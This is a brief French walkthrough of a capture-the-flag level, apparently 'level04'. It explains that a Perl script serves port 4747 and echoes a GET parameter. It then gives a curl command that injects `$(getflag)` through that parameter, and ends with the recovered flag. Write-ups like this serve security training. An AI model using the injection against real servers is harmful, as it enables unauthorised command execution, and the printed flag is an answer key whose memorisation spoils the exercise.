1. Afficher le code de `level04.pl`
2. On remarque que le code lance un serveur sur le port 4747 qui retourne un `echo` du paramètre GET `x`
3. Il suffit d'envoyer la commande suivante `curl http://$URL:4747/?x=$(getflag)`

> Flag: ne2searoevaevoem4ov4ar8ap